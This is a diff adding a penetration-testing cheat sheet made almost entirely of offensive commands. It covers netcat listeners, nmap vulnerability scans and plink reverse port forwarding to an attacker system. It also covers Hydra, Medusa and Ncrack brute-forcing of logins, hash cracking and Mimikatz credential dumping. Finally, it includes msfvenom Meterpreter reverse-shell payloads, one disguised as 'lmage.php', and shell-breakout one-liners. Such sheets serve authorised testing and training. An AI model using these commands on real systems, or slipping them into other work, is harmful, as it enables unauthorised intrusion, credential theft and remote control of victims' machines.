@@ -1,0 +1,104 @@
+Simple Netcat listener and client (ex.port 81):
+nc -lvp 81
+nc -nv <IP> 81
+
+
+Ncat listener and client (ex. port 4444 | SSL enabled |IP whitelist):
+ncat -lvp 4444 --allow <IP> --ssl
+ncat -v <IP> 4444 --ssl
+
+
+NMAP/MSF scanning:
+nmap -Pn -v -sV -O <ip> -oG <ip>_nmap.txt
+nmap -Pn -v -A <ip> -oG <ip>_nmap.txt
+nmap -Pn -v -p <ports> --script=vuln* <IP>
+
+db_nmap -Pn -v -sV -O <ip>
+db_nmap -Pn -v -A <ip>
+db_nmap -v -Pn -A -sU -T 4 --top-ports 500 <ip> (UDP)
+
+
+UNICORNSCAN (Port scanning):
+unicornscan -i tap0 -I -mU <ip>:<port or range> (UDP)
+unicornscan -vv -i tap0 -I -mT <ip>:<port or range> (TCP)
+
+
+DNSRECON (Zone Transfer):
+dnsrecon -a -d <domain name>
+
+
+ATFTPD (Setup TFTP Listener):
+atftpd --daemon --port 69 /tftp
+
+PLINK.EXE (Run on target system - LOCAL). **Example shows forwarding port 445 on the target system to port 4445 on attacker system:
+plink.exe root@ <ip> -R 4445:127.0.0.1:445
+plink.exe -l <user> -pw <password> <ip> -R 4433:127.0.0.1:445
+
+TFTP Windows Client - Target - Local
+tftp -­i <ip> get <file>
+
+SSH SOCK4 Proxy (run on attacker system):
+SSH -D 8080 root@ <ip>
+
+Online Password Cracking with Medusa HTTP:
+medusa -h <ip> -u admin -P passwords.txt -M http -n 8080 -m DIR:/admin -T 30
+
+Online Password Cracking with Hydra (ex. HTTP-Form-Post):
+hydra -l admin -P passwords.txt -t 10 -w 30 <ip> http-form-post "/login-off.asp:txtLoginID=^USER^&txtPassword=^PASS^:ACCESS DENIED"
+
+Online Password Cracking with Hydra (ex. SSH):
+hydra -L users.txt -P passwords.txt -t 4 -v ssh:// <ip>
+
+Online RDP Password Cracking with Ncrack:
+ncrack -vv -T5 --user john -P passwords.txt rdp:// <ip>
+
+Offline Password Cracking with Hashcat (Cisco-IOS MD5):
+hashcat --status --show -a 0 -m 500 <hash-file> <wordlist>
+
+Offline Password Cracking with John (Windows Hashes)
+john -­‐wordlist=/usr/share/wordlists/rockyou.txt <dumpfile> --format=LM
+
+Password list Mangling with John:
+john --wordlist=passwords.txt --rules --stdout > passwords_mangled-1
+john --wordlist=passwords.txt --rules:Jumbo --stdout > passwords_mangled-1
+
+ZIP file password cracking with fcrackzip:
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt /ftphome/bank-account.zip
+
+Meterpreter Mimikatz password hash crack (Windows Hashes):
+load mimikatz \
+msv \
+kerberos
+
+
+MSFVenom PHP Meterpreter Reverse Shell:
+msfvenom -p php/meterpreter/reverse_tcp LHOST= <ip> LPORT=443 -e php/base64 -f raw > lmage.php
+
+MSFVenom Windows Meterpreter Reverse TCP shell:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= <ip> LPORT=443 -f exe > win_met-payload.exe
+
+MSFVenom Linux Meterpreter Reverse TCP shell:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= <ip> LPORT=443 -f elf > linpayload.elf
+
+
+Breakout of "Jail" Shell commands:
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+/bin/sh -i
+
+Verify GLibc version:
+ldd --version
+
+Curl Web Application (Internal & External Links):
+curl <ip> -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
+
+Wget website and grep subdomains:
+wget example.com (saves index.html)
+grep -o '[A-Za-z0-9_\.-]*\.*example.com' index.html |sort -u
+
+Gobuster URL and Directory bruteforce:
+gobuster -u http:// <ip>/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403,500' -e
+
+
+Stderr instead of Stdout:
+2>&1
